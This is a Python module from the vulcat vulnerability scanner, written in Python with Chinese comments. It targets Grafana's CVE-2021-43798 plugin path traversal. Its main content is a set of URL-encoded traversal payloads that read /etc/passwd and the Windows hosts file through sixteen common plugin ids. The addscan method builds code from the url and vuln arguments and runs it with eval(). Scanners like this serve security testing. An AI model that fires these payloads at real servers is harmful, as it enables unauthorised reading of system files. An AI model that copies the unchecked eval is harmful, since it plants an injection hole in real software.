#!/usr/bin/env python3
# -*- coding:utf-8 -*-

''' # ! 由于该POC数据包过多, 只有在指纹识别为Grafana时才会进行扫描, 否则vulcat不会使用该POC

    Grafana扫描类: 
        Grafana 8.x 插件模块文件路径遍历
            CVE-2021-43798
                Payload: https://vulhub.org/#/environments/grafana/CVE-2021-43798/

file:///etc/passwd
file:///C:\Windows\System32\drivers\etc\hosts
'''

from lib.initial.config import config
from lib.tool.md5 import md5, random_md5
from lib.tool.thread import thread
from payloads.Grafana.cve_2021_43798 import cve_2021_43798_scan

class Grafana():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'Grafana'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.cve_2021_43798_payloads = [
            {
                'path': 'public/plugins/{}/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
                'data': ''
            },
            {
                'path': 'public/plugins/{}/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/C:/Windows/System32/drivers/etc/hosts',
                'data': ''
            },
            {
                'path': 'public/plugins/{}/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/C:\Windows\System32\drivers\etc\hosts',
                'data': ''
            },
            {
                'path': 'plugins/{}/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
                'data': ''
            },
            # {
            #     'path': '{}/../../../../../../../../../../../../../etc/passwd',
            #     'data': ''
            # },
        ]
        # * 该漏洞是由插件模块引起的, 以下是一些常见的插件id
        self.cve_2021_43798_plugins = [
            'alertlist',
            'cloudwatch',
            'dashlist',
            'elasticsearch',
            'graph',
            'graphite',
            'heatmap',
            'influxdb',
            'mysql',
            'opentsdb',
            'pluginlist',
            'postgres',
            'prometheus',
            'stackdriver',
            'table',
            'text'
        ]

    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.cve_2021_43798_scan, url=url)
        ]

Grafana.cve_2021_43798_scan = cve_2021_43798_scan

grafana = Grafana()
